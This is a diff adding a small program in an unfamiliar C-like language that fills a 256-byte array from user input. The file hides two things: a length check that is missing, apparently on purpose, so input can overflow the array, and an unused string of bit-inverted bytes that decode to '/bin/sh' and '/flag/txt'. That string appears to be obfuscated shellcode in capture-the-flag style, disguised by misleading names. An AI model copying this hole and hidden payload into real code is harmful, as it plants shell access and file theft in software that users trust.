@@ -1,0 +1,17 @@
+func __rep(__devmem, rsp, _0x551020) {
+    if rsp == _0x551020 {
+        return;
+    }
+    __devmem[rsp] = __devmem[rsp-1];
+    __rep(__devmem, rsp + 1, _0x551020);
+}
+
+func main() {
+    bash = [0 as byte; 256];
+    l = scan();
+    bash[0] = scan() as byte;
+
+    __rep(bash, 1, l);
+    "\xb7\xce\x00\xa8\xa8\xa1\xa5\xb7@\xd0\x9d\x96\x91\xd0\x8c\x97\xff\xb7F\xd0\x99\x93\x9e\x98\xd0\x8b\x87\x8b\xff\xae\xb7v\x18\xb7\xce\t\xb7\xce-\xf0\xfa";
+    print(bash);
+}
